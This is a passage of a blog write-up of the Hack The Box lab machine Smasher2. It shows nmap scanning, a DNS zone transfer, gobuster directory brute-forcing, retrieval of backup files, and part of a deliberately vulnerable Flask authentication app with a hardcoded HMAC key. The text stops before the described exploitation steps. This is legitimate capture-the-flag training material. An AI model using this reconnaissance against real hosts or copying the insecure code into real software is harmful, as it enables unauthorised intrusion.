<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Smasher2 | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - Smasher2" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up / walkthrough for Smasher2 from Hack The Box." />
<meta property="og:description" content="My write-up / walkthrough for Smasher2 from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/smasher2/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/smasher2/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/smasher2/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-12-14T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up / walkthrough for Smasher2 from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/smasher2/","image":"https://0xrick.github.io/hackthebox/smasher2/0.png","headline":"Hack The Box - Smasher2","dateModified":"2019-12-14T00:00:00+02:00","datePublished":"2019-12-14T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/smasher2/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.jpg" width="256px" height="256px" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - Smasher2</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/linux/">linux</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/python/">python</a>
      
      <a class="tag" href="/tag/c/">c</a>
      
      <a class="tag" href="/tag/waf/">waf</a>
      
      <a class="tag" href="/tag/code-analysis/">code-analysis</a>
      
      <a class="tag" href="/tag/reverse-engineering/">reverse-engineering</a>
      
      <a class="tag" href="/tag/mmap/">mmap</a>
      
      <a class="tag" href="/tag/kernel-exploitation/">kernel-exploitation</a>
      
  </div>
  
  <div class="post-date">Published on 14 Dec 2019</div>
  
  <div class="post-description">My write-up / walkthrough for Smasher2 from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br>Hey guys, today smasher2 retired and here’s my write-up about it. Smasher2 was an interesting box and one of the hardest I have ever solved. Starting with a web application vulnerable to authentication bypass and <code class="highlighter-rouge">RCE</code> combined with a <code class="highlighter-rouge">WAF</code> bypass, then a kernel module with an insecure <code class="highlighter-rouge">mmap</code> handler implementation allowing users to access kernel memory. I enjoyed the box and learned a lot from it. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.135</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">smasher2.htb</code>. Let’s jump right in!
<br>
<img src="/images/hackthebox/smasher2/0.png" alt="">
<br></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br>As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/smasher2# nmap -sV -sT -sC -o nmapinitial smasher2.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-13 07:32 EST
Nmap scan report for smasher2.htb (10.10.10.135)
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)
|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)
|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)
53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.74 seconds
root@kali:~/Desktop/HTB/boxes/smasher2# 
</code></pre></div></div>
<p><br>We got <code class="highlighter-rouge">ssh</code> on port 22, <code class="highlighter-rouge">dns</code> on port 53 and <code class="highlighter-rouge">http</code> on port 80.
<br></p>
<hr>

<h2 id="dns">DNS</h2>
<p><br>First thing I did was to enumerate <code class="highlighter-rouge">vhosts</code> through the <code class="highlighter-rouge">dns</code> server and I got 1 result:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/smasher2# dig axfr smasher2.htb @10.10.10.135

; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; axfr smasher2.htb @10.10.10.135
;; global options: +cmd
smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
smasher2.htb.           604800  IN      NS      smasher2.htb.
smasher2.htb.           604800  IN      A       127.0.0.1
smasher2.htb.           604800  IN      AAAA    ::1
smasher2.htb.           604800  IN      PTR     wonderfulsessionmanager.smasher2.htb.
smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
;; Query time: 299 msec
;; SERVER: 10.10.10.135#53(10.10.10.135)
;; WHEN: Fri Dec 13 07:36:43 EST 2019
;; XFR size: 6 records (messages 1, bytes 242)

root@kali:~/Desktop/HTB/boxes/smasher2# 
</code></pre></div></div>
<p><br><code class="highlighter-rouge">wonderfulsessionmanager.smasher2.htb</code>, I added it to my <code class="highlighter-rouge">hosts</code> file.
<br></p>
<hr>

<h2 id="web-enumeration">Web Enumeration</h2>
<p><br><code class="highlighter-rouge">http://smasher2.htb</code> had the default <code class="highlighter-rouge">Apache</code> index page:<br>
<img src="/images/hackthebox/smasher2/1.png" alt="">
<br><br>
<code class="highlighter-rouge">http://wonderfulsessionmanager.smasher2.htb</code>:<br>
<img src="/images/hackthebox/smasher2/2.png" alt="">
<br><br>The only interesting here was the login page:<br>
<img src="/images/hackthebox/smasher2/3.png" alt="">
<br><br>I kept testing it for a while and the responses were like this one:<br>
<img src="/images/hackthebox/smasher2/4.png" alt="">
<br><br>
<img src="/images/hackthebox/smasher2/5.png" alt="">
<br><br>It didn’t request any new pages so I suspected that it’s doing an <code class="highlighter-rouge">AJAX</code> request, I intercepted the login request to find out the endpoint it was requesting:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/auth</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">wonderfulsessionmanager.smasher2.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/javascript, */*; q=0.01</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://wonderfulsessionmanager.smasher2.htb/login</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">80</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=eyJpZCI6eyIgYiI6Ik16UXpNakpoTVRVeVlqaGlNekJsWVdSbU9HTXlPV1kzTmprMk1XSTROV00xWkdVME5HTmxNQT09In19.XfNxUQ.MznJKgs2isklCZxfV4G0IjEPcvg</span>

<span class="p">{</span><span class="s2">"action"</span><span class="p">:</span><span class="s2">"auth"</span><span class="p">,</span><span class="s2">"data"</span><span class="p">:{</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"test"</span><span class="p">,</span><span class="s2">"password"</span><span class="p">:</span><span class="s2">"test"</span><span class="p">}}</span><span class="w">
</span></code></pre></div></div>
<p><br>While browsing <code class="highlighter-rouge">http://wonderfulsessionmanager.smasher2.htb</code> I had <code class="highlighter-rouge">gobuster</code> running in the background on <code class="highlighter-rouge">http://smasher2.htb/</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/smasher2# gobuster dir -u http://smasher2.htb/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://smasher2.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/13 07:37:54 Starting gobuster
===============================================================
/.git/HEAD (Status: 403)
/.hta (Status: 403)
/.bash_history (Status: 403)
/.config (Status: 403)
/.bashrc (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.profile (Status: 403)
/.mysql_history (Status: 403)
/.sh_history (Status: 403)
/.svn/entries (Status: 403)
/_vti_bin/_vti_adm/admin.dll (Status: 403)
/_vti_bin/shtml.dll (Status: 403)
/_vti_bin/_vti_aut/author.dll (Status: 403)
/akeeba.backend.log (Status: 403)
/awstats.conf (Status: 403)
/backup (Status: 301)
/development.log (Status: 403)
/global.asa (Status: 403)
/global.asax (Status: 403)
/index.html (Status: 200)
/main.mdb (Status: 403)
/php.ini (Status: 403)
/production.log (Status: 403)
/readfile (Status: 403)
/server-status (Status: 403)
/spamlog.log (Status: 403)
/Thumbs.db (Status: 403)
/thumbs.db (Status: 403)
/web.config (Status: 403)
/WS_FTP.LOG (Status: 403)
===============================================================
2019/12/13 07:39:17 Finished
===============================================================
root@kali:~/Desktop/HTB/boxes/smasher2# 
</code></pre></div></div>
<p><br>The only result that wasn’t <code class="highlighter-rouge">403</code> was <code class="highlighter-rouge">/backup</code> so I checked that and found 2 files:
<img src="/images/hackthebox/smasher2/6.png" alt="">
<br><br>Note: Months ago when I solved this box for the first time <code class="highlighter-rouge">/backup</code> was protected by basic <code class="highlighter-rouge">http</code> authentication, that wasn’t the case when I revisited the box for the write-up even after resetting it. I guess it got removed, however it wasn’t an important step, it was just heavy brute force so the box is better without it.
<br><br>I downloaded the files to my box:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/smasher2# mkdir backup
root@kali:~/Desktop/HTB/boxes/smasher2# cd backup/
root@kali:~/Desktop/HTB/boxes/smasher2/backup# wget http://smasher2.htb/backup/auth.py
--2019-12-13 07:40:19--  http://smasher2.htb/backup/auth.py
Resolving smasher2.htb (smasher2.htb)... 10.10.10.135
Connecting to smasher2.htb (smasher2.htb)|10.10.10.135|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4430 (4.3K) [text/x-python]
Saving to: ‘auth.py’

auth.py                                                    100%[=======================================================================================================================================&gt;]   4.33K  --.-KB/s    in 0.07s   

2019-12-13 07:40:20 (64.2 KB/s) - ‘auth.py’ saved [4430/4430]

root@kali:~/Desktop/HTB/boxes/smasher2/backup# wget http://smasher2.htb/backup/ses.so 
--2019-12-13 07:40:43--  http://smasher2.htb/backup/ses.so
Resolving smasher2.htb (smasher2.htb)... 10.10.10.135
Connecting to smasher2.htb (smasher2.htb)|10.10.10.135|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18608 (18K)
Saving to: ‘ses.so’

ses.so                                                     100%[=======================================================================================================================================&gt;]  18.17K  85.2KB/s    in 0.2s    

2019-12-13 07:40:44 (85.2 KB/s) - ‘ses.so’ saved [18608/18608]

root@kali:~/Desktop/HTB/boxes/smasher2/backup# 
</code></pre></div></div>
<p><br>By looking at <code class="highlighter-rouge">auth.py</code> I knew that these files were related to <code class="highlighter-rouge">wonderfulsessionmanager.smasher2.htb</code>.
<br></p>
<hr>

<h2 id="authpy-analysis">auth.py: Analysis</h2>
<p><br><code class="highlighter-rouge">auth.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">ses</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">session</span><span class="p">,</span><span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span><span class="n">render_template</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span><span class="n">Flask</span><span class="p">,</span> <span class="n">send_from_directory</span>
<span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Lock</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">get_secure_key</span><span class="p">():</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
    <span class="n">m</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">m</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">craft_secure_token</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
    <span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">"HMACSecureKey123!"</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>


<span class="n">lock</span> <span class="o">=</span> <span class="n">Lock</span><span class="p">()</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_secure_key</span><span class="p">()</span>
<span class="n">Managers</span> <span class="o">=</span> <span class="p">{}</span>

<span class="k">def</span> <span class="nf">log_creds</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"creds.log"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">creds</span><span class="p">:</span>
        <span class="n">creds</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"Login from {} with data {}:{}</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">c</span><span class="p">[</span><span class="s">"username"</span><span class="p">],</span> <span class="n">c</span><span class="p">[</span><span class="s">"password"</span><span class="p">]))</span>
        <span class="n">creds</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">safe_get_manager</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
    <span class="n">manager</span> <span class="o">=</span> <span class="n">Managers</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span>
    <span class="n">lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">manager</span>

<span class="k">def</span> <span class="nf">safe_init_manager</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
    <span class="k">if</span> <span class="nb">id</span> <span class="ow">in</span> <span class="n">Managers</span><span class="p">:</span>
        <span class="k">del</span> <span class="n">Managers</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
            <span class="n">login</span> <span class="o">=</span> <span class="p">[</span><span class="s">"&lt;REDACTED&gt;"</span><span class="p">,</span> <span class="s">"&lt;REDACTED&gt;"</span><span class="p">]</span>
            <span class="n">Managers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="nb">id</span><span class="p">:</span> <span class="n">ses</span><span class="o">.</span><span class="n">SessionManager</span><span class="p">(</span><span class="n">login</span><span class="p">,</span> <span class="n">craft_secure_token</span><span class="p">(</span><span class="s">":"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">login</span><span class="p">)))})</span>
    <span class="n">lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">safe_have_manager</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="n">lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="nb">id</span> <span class="ow">in</span> <span class="n">Managers</span>
    <span class="n">lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="nd">@app.before_request</span>
<span class="k">def</span> <span class="nf">before_request</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="s">"/"</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="s">"id"</span><span class="p">):</span>
            <span class="n">k</span> <span class="o">=</span> <span class="n">get_secure_key</span><span class="p">()</span>
            <span class="n">safe_init_manager</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
            <span class="n">session</span><span class="p">[</span><span class="s">"id"</span><span class="p">]</span> <span class="o">=</span> <span class="n">k</span>
        <span class="k">elif</span> <span class="n">session</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="s">"id"</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">safe_have_manager</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">"id"</span><span class="p">]):</span>
            <span class="k">del</span> <span class="n">session</span><span class="p">[</span><span class="s">"id"</span><span class="p">]</span>
            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="mi">302</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="s">"id"</span><span class="p">)</span> <span class="ow">and</span> <span class="n">safe_have_manager</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">"id"</span><span class="p">]):</span>
            <span class="k">pass</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="mi">302</span><span class="p">)</span>

<span class="nd">@app.after_request</span>
<span class="k">def</span> <span class="nf">after_request</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">resp</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/assets/&lt;path:filename&gt;'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">base_static</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">root_path</span> <span class="o">+</span> <span class="s">'/assets/'</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">)</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/login'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">view_login</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"login.html"</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/auth'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="p">{</span><span class="s">"authenticated"</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span> <span class="s">"result"</span><span class="p">:</span> <span class="bp">None</span><span class="p">}</span>
    <span class="n">manager</span> <span class="o">=</span> <span class="n">safe_get_manager</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">"id"</span><span class="p">])</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">(</span><span class="n">silent</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">tmp_login</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s">"data"</span><span class="p">])</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>
        <span class="n">tmp_user_login</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">is_logged</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="n">check_login</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">secret_token_info</span> <span class="o">=</span> <span class="p">[</span><span class="s">"/api/&lt;api_key&gt;/job"</span><span class="p">,</span> <span class="n">manager</span><span class="o">.</span><span class="n">secret_key</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())]</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">tmp_user_login</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username"</span><span class="p">:</span> <span class="n">tmp_login</span><span class="p">[</span><span class="s">"username"</span><span class="p">],</span> <span class="s">"password"</span><span class="p">:</span> <span class="n">tmp_login</span><span class="p">[</span><span class="s">"password"</span><span class="p">]}</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">is_logged</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"authenticated"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Cannot authenticate with data: </span><span class="si">%</span><span class="s">s - </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">is_logged</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"Too many tentatives, wait 2 minutes!"</span> <span class="k">if</span> <span class="n">manager</span><span class="o">.</span><span class="n">blocked</span> <span class="k">else</span> <span class="s">"Try again!"</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">tmp_user_login</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                    <span class="n">log_creds</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="p">,</span> <span class="n">tmp_user_login</span><span class="p">)</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"authenticated"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"endpoint"</span><span class="p">:</span> <span class="n">secret_token_info</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">"key"</span><span class="p">:</span> <span class="n">secret_token_info</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"creation_date"</span><span class="p">:</span> <span class="n">secret_token_info</span><span class="p">[</span><span class="mi">2</span><span class="p">]}</span>
        <span class="k">except</span> <span class="nb">TypeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">ret</span><span class="p">[</span><span class="s">"authenticated"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
            <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ret</span><span class="p">[</span><span class="s">"authenticated"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="n">ret</span><span class="p">[</span><span class="s">"result"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Cannot authenticate missing parameters."</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/api/&lt;key&gt;/job"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">job</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="p">{</span><span class="s">"success"</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span> <span class="s">"result"</span><span class="p">:</span> <span class="bp">None</span><span class="p">}</span>
    <span class="n">manager</span> <span class="o">=</span> <span class="n">safe_get_manager</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">"id"</span><span class="p">])</span>
    <span class="k">if</span> <span class="n">manager</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">==</span> <span class="n">key</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">(</span><span class="n">silent</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">data</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
